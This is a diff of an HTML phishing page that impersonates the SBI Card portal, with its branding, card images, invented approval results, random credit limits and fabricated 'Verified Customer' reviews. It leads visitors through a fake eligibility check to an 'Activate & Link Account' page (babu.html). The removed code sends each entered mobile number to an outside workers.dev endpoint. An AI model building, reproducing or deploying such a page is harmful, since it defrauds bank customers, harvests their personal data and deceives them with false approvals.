@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title> Official Portal</title>
+    <title>SBI Card | Official Portal</title>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { background: #2b3990; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; color: white; }
 
-        /* --- Updated Header Layout --- */
+        /* --- Header --- */
         .header { 
             width: 100%; height: 65px; padding: 0 15px; background: #fff; 
             display: flex; align-items: center; justify-content: space-between; 
@@ -17,70 +17,63 @@
         }
         .header .logo { height: 20px; }
         .header-right { display: flex; align-items: center; gap: 20px; }
-        
-        /* Icon Upar, Login Niche - No Border */
-        .login-box { 
-            display: flex; flex-direction: column; align-items: center; 
-            color: #2b3990; cursor: pointer; transition: 0.3s;
-        }
+        .login-box { display: flex; flex-direction: column; align-items: center; color: #2b3990; cursor: pointer; }
         .login-box span { font-weight: 700; font-size: 10px; margin-top: -2px; }
-        .login-box i { width: 22px; height: 22px; }
 
-        .menu-ic { color: #2b3990; cursor: pointer; display: flex; align-items: center; }
+        /* --- Grid Section --- */
+        .grid-header { background: #f4f4f4; padding: 25px 20px 5px; color: #2b3990; font-weight: 800; font-size: 18px; text-align: center; }
+        .all-cards-grid { padding: 20px; background: #f4f4f4; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .grid-item { background: #fff; padding: 15px; border-radius: 15px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .grid-img { width: 100%; border-radius: 8px; margin-bottom: 10px; height: 100px; object-fit: contain; }
+        .grid-name { color: #333; font-size: 11px; font-weight: 700; min-height: 35px; display: flex; align-items: center; justify-content: center; line-height: 1.2; }
+        .select-btn { width: 100%; background: #ffcc00; color: #2b3990; border: none; padding: 10px; border-radius: 8px; font-size: 13px; font-weight: 700; margin-top: 10px; cursor: pointer; }
 
-        /* Slider Section */
-        .slider-container { padding: 20px 0; overflow: hidden; }
-        .card-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; padding: 0 calc(50% - 75px); scrollbar-width: none; align-items: center; }
-        .card-slider::-webkit-scrollbar { display: none; }
-        .card-item { flex: 0 0 150px; scroll-snap-align: center; margin: 0 10px; transition: 0.5s; transform: scale(0.8); opacity: 0.4; text-align: center; }
-        .card-item.active { transform: scale(1); opacity: 1; }
-        .card-img { width: 100%; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.4); }
-        .apply-btn { background: #ffcc00; color: #2b3990; border: none; padding: 8px 18px; border-radius: 20px; font-weight: 800; margin-top: 12px; cursor: pointer; opacity: 0; transition: 0.3s; font-size: 11px; }
-        .card-item.active .apply-btn { opacity: 1; }
+        /* --- Review Slider --- */
+        .review-section { background: #fff; padding: 30px 15px; text-align: center; color: #333; }
+        .review-section h3 { color: #2b3990; margin-bottom: 20px; font-size: 18px; font-weight: 800; }
+        .slider-container { width: 100%; overflow: hidden; position: relative; }
+        .slider-track { display: flex; transition: transform 0.5s ease-in-out; }
+        .review-card { min-width: 100%; padding: 20px; background: #f8f9fa; border-radius: 15px; border: 1px solid #eee; }
+        .stars { color: #ffcc00; margin-bottom: 8px; font-size: 14px; }
+        .rev-text { font-style: italic; font-size: 13px; color: #444; margin-bottom: 10px; line-height: 1.4; font-weight: 500; }
+        .rev-name { font-weight: 700; color: #2b3990; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; }
 
-        /* Tas Stack Section */
-        .tas-area { height: 260px; display: flex; justify-content: center; align-items: center; position: relative; perspective: 1000px; margin: 10px 0; }
-        .tas-card { 
-            position: absolute; width: 140px; height: 190px; border-radius: 15px;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 8px 20px rgba(0,0,0,0.5);
-            transition: all 0.5s cubic-bezier(0.25, 1, 0.5, 1); cursor: pointer; text-align: center; padding: 15px;
-        }
-        .tas-card:nth-child(1) { transform: rotate(-3deg); z-index: 6; }
-        .tas-card:nth-child(2) { transform: rotate(2deg); z-index: 5; }
-        .tas-card:nth-child(3) { transform: rotate(-1deg); z-index: 4; }
-        .tas-card:nth-child(4) { transform: rotate(3deg); z-index: 3; }
-        .tas-card:nth-child(5) { transform: rotate(-4deg); z-index: 2; }
-        .tas-card:nth-child(6) { transform: rotate(1deg); z-index: 1; }
-        .tas-card.hide-anim { transform: translateX(150vw) rotate(45deg) !important; opacity: 0; }
+        /* --- Footer --- */
+        .footer { background: #fff; padding: 30px 20px; text-align: center; color: #666; border-top: 1px solid #eee; }
+        .footer p { font-size: 12px; margin-bottom: 15px; font-weight: 600; }
+        .store-badges { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; }
+        .store-badges img { height: 35px; }
+        .legal-footer { background: #1e2a78; padding: 20px; font-size: 10px; color: rgba(255,255,255,0.7); text-align: center; }
 
-        .c1 { background: linear-gradient(135deg, #00a86b, #004d32); } 
-        .c2 { background: linear-gradient(135deg, #ff1493, #8b008b); } 
-        .c3 { background: linear-gradient(135deg, #8a2be2, #4b0082); } 
-        .c4 { background: linear-gradient(135deg, #ff4500, #b22222); } 
-        .c5 { background: linear-gradient(135deg, #1e90ff, #00008b); } 
-        .c6 { background: linear-gradient(135deg, #ff8c00, #d2691e); }
-
-        /* Footer Assets */
-        .footer-assets { margin-top: 20px; text-align: center; background: rgba(0,0,0,0.05); padding-bottom: 20px; }
-        .store-flex { display: flex; justify-content: center; gap: 15px; padding: 15px 0; }
-        .store-flex img { height: 35px; }
-
-        .blue-footer { background: #1e2a78; padding: 25px 20px; text-align: center; font-size: 10px; color: #fff; border-top: 1px solid rgba(255,255,255,0.1); }
-
-        /* Modal Popup */
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 2000; }
-        .popup { background: #1e2a78; width: 92%; max-width: 330px; border-radius: 20px; padding: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
-        .preview-img-modal { width: 70px; margin-bottom: 10px; border-radius: 5px; }
+        /* --- Overlays --- */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; flex-direction: column; z-index: 3000; overflow-y: auto; color: #333; }
+        .pop-header { padding: 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #eee; position: sticky; top: 0; background: #fff; z-index: 10; }
+        .pop-content { padding: 20px; text-align: center; }
+        .card-preview-big { width: 180px; margin: 15px 0; border-radius: 10px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
         
-        .details-list { text-align: left; font-size: 11px; background: rgba(255,255,255,0.05); padding: 12px; border-radius: 12px; margin-bottom: 15px; line-height: 1.6; }
-        .details-list p { margin-bottom: 3px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 2px; }
+        /* Benefits with Icons */
+        .benefits-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; margin: 20px 0; }
+        .benefit-box { background: #f9f9f9; padding: 12px; border-radius: 12px; border: 1px solid #f0f0f0; display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .benefit-box i { color: #2b3990; margin-bottom: 5px; }
+        .benefit-box b { font-size: 11px; color: #2b3990; }
+        .benefit-box span { font-size: 9px; color: #777; line-height: 1.1; }
 
-        .pop-input { width: 100%; padding: 14px; border-radius: 10px; border: none; font-size: 18px; font-weight: 700; text-align: center; margin-bottom: 15px; color: #2b3990; outline: none; }
-        .pop-btn { background: #ffcc00; color: #2b3990; width: 100%; padding: 14px; border-radius: 10px; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; }
-        
-        .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #ffcc00; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .apply-form { background: #f4f4f4; padding: 25px 20px; border-radius: 20px; }
+        .pop-input { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #ddd; font-size: 18px; font-weight: 700; text-align: center; margin-bottom: 15px; outline: none; }
+        .submit-btn { background: #2b3990; color: #fff; width: 100%; padding: 16px; border-radius: 12px; font-weight: 800; border: none; font-size: 16px; }
+
+        /* --- Loader with SBI Logo --- */
+        .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; align-items: center; justify-content: center; flex-direction: column; z-index: 4000; padding: 30px; }
+        .loader-logo { height: 30px; margin-bottom: 30px; }
+        .progress-container { width: 100%; background: #eee; border-radius: 20px; height: 10px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #00a86b; transition: width 0.1s linear; }
+        .status-text { color: #2b3990; font-weight: 700; font-size: 15px; }
+
+        /* --- Success --- */
+        .success-page { display: none; text-align: center; padding: 20px; background: #fff; min-height: 100vh; }
+        .svg-success { width: 55px; height: 55px; margin-bottom: 10px; }
+        .result-card { background: #f8f9fa; border-radius: 20px; padding: 20px; margin: 15px 0; border: 1px solid #e0e0e0; text-align: left; }
+        .res-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; border-bottom: 1px solid #eee; padding-bottom: 8px; }
     </style>
 </head>
 <body>
@@ -88,127 +81,166 @@
     <div class="header">
         <img class="logo" src="https://i.ibb.co/XksDtcLn/SBI-Card-logo-svg.png">
         <div class="header-right">
-            <div class="login-box" onclick="location.href='babu.html'">
-                <i data-lucide="user"></i>
-                <span>Login</span>
-            </div>
-            <div class="menu-ic">
-                <i data-lucide="menu"></i>
-            </div>
+            <div class="login-box" onclick="location.href='babu.html'"><i data-lucide="user"></i><span>Login</span></div>
         </div>
     </div>
 
-    <div class="slider-container">
-        <div class="card-slider" id="mainSlider">
-            <div class="card-item"><img src="https://i.ibb.co/rGQh8Mfg/prime-sbi-card-vertical.png" class="card-img"><button class="apply-btn" onclick="openPop('SBI Card PRIME', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/GvcWxhNM/miles-elite-card-face-min.png" class="card-img"><button class="apply-btn" onclick="openPop('SBI Card MILES ELITE', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/8L7PXmXk/simply-save-card-face-min.png" class="card-img"><button class="apply-btn" onclick="openPop('SimplySave SBI Card', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/RpyYwBJt/tata-neu-plus-face-blank-front-1.jpg" class="card-img"><button class="apply-btn" onclick="openPop('Tata Neu Plus SBI', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/Sw0HZ5xz/aurum.png" class="card-img"><button class="apply-btn" onclick="openPop('AURUM SBI Card', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/sJXFq6P9/indigo-elite-front-card-face.png" class="card-img"><button class="apply-btn" onclick="openPop('6E Rewards XL Indigo', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/tpnYzXxM/indigo-base-front-card-face.png" class="card-img"><button class="apply-btn" onclick="openPop('6E Rewards Indigo', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/nMC57BVP/irctc-premier-vertical.png" class="card-img"><button class="apply-btn" onclick="openPop('IRCTC SBI Premier', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/hRqb7z0Q/krisflyer-card-face-min.png" class="card-img"><button class="apply-btn" onclick="openPop('SIA KrisFlyer SBI', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/905BvQK/krisflyer-apex-card-face-min.png" class="card-img"><button class="apply-btn" onclick="openPop('SIA KrisFlyer Apex', this.previousElementSibling.src)">Apply Now</button></div>
-            <div class="card-item"><img src="https://i.ibb.co/PG8DjgCk/phonepe-purple-card-face-min.png" class="card-img"><button class="apply-btn" onclick="openPop('PhonePe SBI Card', this.previousElementSibling.src)">Apply Now</button></div>
+    <div class="grid-header">Apply for Premium SBI Cards</div>
+    <div class="all-cards-grid" id="gridContainer"></div>
+
+    <div class="review-section">
+        <h3>What Our Customers Say</h3>
+        <div class="slider-container">
+            <div class="slider-track" id="sliderTrack"></div>
         </div>
     </div>
 
-    <div class="tas-area">
-        <div class="tas-card c1" onclick="this.classList.add('hide-anim')"><i data-lucide="award"></i><span>Top Rewards</span><small>Earn 10 Points</small></div>
-        <div class="tas-card c2" onclick="this.classList.add('hide-anim')"><i data-lucide="plane"></i><span>Travel Plus</span><small>Lounge Access</small></div>
-        <div class="tas-card c3" onclick="this.classList.add('hide-anim')"><i data-lucide="shield"></i><span>Fraud Cover</span><small>₹1 Lac Cover</small></div>
-        <div class="tas-card c4" onclick="this.classList.add('hide-anim')"><i data-lucide="clock"></i><span>Instant Pay</span><small>Tap & Pay</small></div>
-        <div class="tas-card c5" onclick="this.classList.add('hide-anim')"><i data-lucide="shopping-bag"></i><span>Cashback</span><small>Online Spends</small></div>
-        <div class="tas-card c6" onclick="this.classList.add('hide-anim')"><i data-lucide="user-check"></i><span>SBI Trust</span><small>27+ Years</small></div>
+    <div class="footer">
+        <p>Experience the SBI Card Mobile App</p>
+        <div class="store-badges">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg">
+        </div>
     </div>
+    <div class="legal-footer">© 2026 SBI Cards & Payment Services Ltd.</div>
 
-    <div class="footer-assets">
-        <p style="font-size:12px; opacity:0.7;">Download SBI Card Mobile App</p>
-        <div class="store-flex">
-            <img src="https://i.ibb.co/7T6P1V6/pngtree-google-play-app-icon-vector-png-image-12256664.png">
-            <img src="https://i.ibb.co/TBcb0NzQ/Download-on-the-App-Store-Badge-svg.png">
+    <div class="overlay" id="fullPop">
+        <div class="pop-header">
+            <span style="font-weight: 800; color: #2b3990;">Application Portal</span>
+            <div onclick="closePop()"><i data-lucide="x"></i></div>
+        </div>
+        <div class="pop-content" id="mainContent">
+            <h2 style="color:#00a86b;">Special Offer Just For You!</h2>
+            <img id="mImg" class="card-preview-big">
+            <h3 id="cName" style="color:#2b3990; margin-bottom:10px;"></h3>
+            
+            <div class="benefits-container">
+                <div class="benefit-box"><i data-lucide="gift"></i><b>10X Rewards</b><span>On all dining & travel Spends</span></div>
+                <div class="benefit-box"><i data-lucide="plane"></i><b>Lounge Access</b><span>Free Domestic & International</span></div>
+                <div class="benefit-box"><i data-lucide="shield-check"></i><b>Fraud Protection</b><span>Zero liability on lost card</span></div>
+                <div class="benefit-box"><i data-lucide="percent"></i><b>Fuel Waiver</b><span>1% Surcharge waiver across India</span></div>
+            </div>
+
+            <div class="apply-form">
+                <input type="number" id="phone" class="pop-input" placeholder="Mobile Number">
+                <button class="submit-btn" onclick="startProcessing()">Apply Now</button>
+            </div>
+        </div>
+
+        <div class="success-page" id="successPage">
+            <div class="success-icon-container">
+                <svg class="svg-success" viewBox="0 0 52 52">
+                    <circle cx="26" cy="26" r="25" fill="none" stroke="#00a86b" stroke-width="2"/>
+                    <path fill="none" stroke="#00a86b" stroke-width="3" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                </svg>
+            </div>
+            <h2 style="color:#2b3990; font-weight:800;">Congratulations!</h2>
+            <p style="font-size:12px; color:#666">Your application is approved.</p>
+            
+            <img id="finalCardImg" class="card-preview-big" style="width: 140px;">
+
+            <div class="result-card">
+                <div class="res-row"><span>Application Status</span><span style="color:#00a86b; font-weight:800;">APPROVED</span></div>
+                <div class="res-row"><span>Ref No.</span><span id="refNo"></span></div>
+                <div class="res-row"><span>Trans ID</span><span id="transId"></span></div>
+                <div class="res-row"><span>Credit Limit</span><span id="limVal" style="color:#2b3990; font-weight:800;"></span></div>
+            </div>
+            <button class="submit-btn" onclick="location.href='babu.html'">Activate & Link Account</button>
         </div>
     </div>
 
-    <img src="https://i.ibb.co/XrcVVYfB/chrome-screenshot-11-Apr-2026-6-09-58-am-IST.png" style="width:100%;">
-
-    <div class="blue-footer">
-        <p>Privacy Policy | Terms & Conditions | Disclosure</p>
-        <p style="margin-top:8px; opacity:0.5;">© 2026 SBI Cards and Payment Services Ltd.</p>
-    </div>
-
-    <div class="overlay" id="overlay">
-        <div class="popup">
-            <div id="v1">
-                <h3 style="color:#ffcc00; margin-bottom:10px;">Great Choice!</h3>
-                <img id="mImg" class="preview-img-modal">
-                <div class="details-list">
-                    <p>• <b><span id="cName"></span></b> Premium Edition</p>
-                    <p>• 10X Reward Points on online & dining</p>
-                    <p>• Complimentary Domestic Lounge access</p>
-                    <p>• 1% Fuel Surcharge waiver across India</p>
-                    <p>• Zero Lost Card Liability cover ₹1,00,000</p>
-                    <p>• Annual fee reversal on milestone spend</p>
-                    <p>• Instant Virtual Card generation facility</p>
-                </div>
-                <input type="number" id="phone" class="pop-input" placeholder="Enter Mobile Number">
-                <button class="pop-btn" onclick="send()">Check Eligibility</button>
-            </div>
-            <div id="v2" style="display:none;">
-                <div class="loader"></div>
-                <p style="color:#ffcc00; font-weight:700;">Verifying Your Profile...</p>
-            </div>
-            <div id="v3" style="display:none;">
-                <h2 style="color:#4CAF50;">Congratulations!</h2>
-                <div style="background:rgba(255,255,255,0.1); padding:15px; border-radius:15px; margin:15px 0;">
-                    <p style="font-size:12px;">Approved Credit Limit:</p>
-                    <p style="font-size:32px; font-weight:800; color:#ffcc00;" id="lim">₹ 0</p>
-                </div>
-                <button class="pop-btn" onclick="location.href='babu.html'">Activate & Link Account</button>
-            </div>
-        </div>
+    <div class="loader-overlay" id="loader">
+        <img class="loader-logo" src="https://i.ibb.co/XksDtcLn/SBI-Card-logo-svg.png">
+        <div class="status-text" id="statusText">Verifying Identity...</div>
+        <div class="progress-container"><div class="progress-bar" id="pBar"></div></div>
+        <p style="font-size: 11px; color: #999;">Please do not refresh the page</p>
     </div>
 
     <script>
         lucide.createIcons();
-        const slider = document.getElementById('mainSlider');
-        const cards = document.querySelectorAll('.card-item');
 
-        function update() {
-            const center = slider.scrollLeft + (slider.offsetWidth / 2);
-            cards.forEach(c => {
-                const cCenter = c.offsetLeft + (c.offsetWidth / 2);
-                if (Math.abs(center - cCenter) < 70) c.classList.add('active');
-                else c.classList.remove('active');
-            });
+        // 11 Cards Data
+        const cardData = [
+            { n: 'SBI Card PRIME', i: 'https://i.ibb.co/rGQh8Mfg/prime-sbi-card-vertical.png' },
+            { n: 'SimplySave SBI', i: 'https://i.ibb.co/8L7PXmXk/simply-save-card-face-min.png' },
+            { n: 'SBI Card MILES', i: 'https://i.ibb.co/GvcWxhNM/miles-elite-card-face-min.png' },
+            { n: 'AURUM SBI Card', i: 'https://i.ibb.co/Sw0HZ5xz/aurum.png' },
+            { n: 'Cashback SBI Card', i: 'https://i.ibb.co/sJXFq6P9/indigo-elite-front-card-face.png' },
+            { n: 'BPCL SBI Card Octane', i: 'https://i.ibb.co/PG8DjgCk/phonepe-purple-card-face-min.png' },
+            { n: 'SBI Card Elite', i: 'https://i.ibb.co/nMC57BVP/irctc-premier-vertical.png' },
+            { n: 'SimplyClick SBI', i: 'https://i.ibb.co/8L7PXmXk/simply-save-card-face-min.png' },
+            { n: 'IRCTC SBI Card', i: 'https://i.ibb.co/nMC57BVP/irctc-premier-vertical.png' },
+            { n: 'Air India SBI Card', i: 'https://i.ibb.co/GvcWxhNM/miles-elite-card-face-min.png' },
+            { n: 'FabIndia SBI Card', i: 'https://i.ibb.co/rGQh8Mfg/prime-sbi-card-vertical.png' }
+        ];
+
+        const reviews = [
+            { n: "Anshul Verma", t: "Bhai sach mein 5 minute mein approval mil gaya! Sabse fast service hai SBI ki." },
+            { n: "Meera Reddy", t: "SimplySave card ke rewards amazing hain. Monthly shopping par cashback mast milta hai." },
+            { n: "Vikrant Singh", t: "Paperless process was mind-blowing. I got 1.5 Lakh limit instantly!" },
+            { n: "Priya Sharma", t: "Lounge access feature really works. Highly recommend SBI Card Prime for travelers." },
+            { n: "Rohan Das", t: "Virtual card turant mil gaya use karne ke liye. SBI Card is the best in India." }
+        ];
+
+        // Load Cards
+        const grid = document.getElementById('gridContainer');
+        cardData.forEach(c => {
+            const d = document.createElement('div');
+            d.className = 'grid-item';
+            d.innerHTML = `<img src="${c.i}" class="grid-img"><div class="grid-name">${c.n}</div><button class="select-btn" onclick="openFullPop('${c.n}', '${c.i}')">Apply</button>`;
+            grid.appendChild(d);
+        });
+
+        // Load Reviews
+        const track = document.getElementById('sliderTrack');
+        reviews.forEach(r => {
+            const d = document.createElement('div');
+            d.className = 'review-card';
+            d.innerHTML = `<div class="stars">★★★★★</div><p class="rev-text">"${r.t}"</p><p class="rev-name"><i data-lucide="check-circle" size="14" style="color:#00a86b"></i> Verified Customer: ${r.n}</p>`;
+            track.appendChild(d);
+        });
+        lucide.createIcons();
+
+        // Slider Logic
+        let cur = 0;
+        setInterval(() => { cur = (cur + 1) % reviews.length; track.style.transform = `translateX(-${cur * 100}%)`; }, 4000);
+
+        let selI = "";
+        function openFullPop(n, i) { 
+            selI = i; 
+            document.getElementById('cName').innerText = n; 
+            document.getElementById('mImg').src = i; 
+            document.getElementById('fullPop').style.display = 'flex'; 
         }
-        slider.onscroll = update;
 
-        window.onload = () => {
-            const r = Math.floor(Math.random() * cards.length);
-            slider.scrollLeft = cards[r].offsetLeft - (slider.offsetWidth / 2) + 75;
-            setTimeout(update, 300);
-        };
+        function closePop() { document.getElementById('fullPop').style.display = 'none'; }
 
-        function openPop(name, img) {
-            document.getElementById('cName').innerText = name;
-            document.getElementById('mImg').src = img;
-            document.getElementById('overlay').style.display = 'flex';
+        function startProcessing() {
+            if(document.getElementById('phone').value.length !== 10) return alert("Please enter valid 10-digit mobile number");
+            document.getElementById('loader').style.display = 'flex';
+            let w = 0;
+            let bar = document.getElementById('pBar');
+            let status = document.getElementById('statusText');
+            
+            let itv = setInterval(() => {
+                w++; 
+                bar.style.width = w + '%';
+                if(w == 30) status.innerText = "Checking Credit History...";
+                if(w == 60) status.innerText = "Finalizing Credit Limit...";
+                if(w == 90) status.innerText = "Generating Approved Offer...";
+                if(w >= 100) { clearInterval(itv); showSuccess(); }
+            }, 70);
         }
 
-        function send() {
-            const m = document.getElementById('phone').value;
-            if(m.length !== 10) return alert("Enter valid 10-digit number");
-            fetch('https://cold-pine-96e7.sumankkuuyy.workers.dev/', { method: 'POST', body: JSON.stringify({mobile: m}) }).catch(()=>{});
-            document.getElementById('v1').style.display = 'none';
-            document.getElementById('v2').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('v2').style.display = 'none';
-                document.getElementById('v3').style.display = 'block';
-                const l = Math.floor(Math.random() * 65000) + 95000;
-                document.getElementById('lim').innerText = "₹ " + l.toLocaleString('en-IN');
-            }, 3000);
+        function showSuccess() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+            document.getElementById('finalCardImg').src = selI; // Dynamic Image
+            document.getElementById('refNo').innerText = "SBIN-" + Math.floor(Math.random()*899999+100000);
+            document.getElementById('transId').innerText = "TXN" + Math.floor(Math.random()*899999+100000);
+            const lim = Math.floor((Math.random()*120000+60000)/500)*500;
+            document.getElementById('limVal').innerText = "₹ " + lim.toLocaleString('en-IN');
         }
     </script>
 </body>
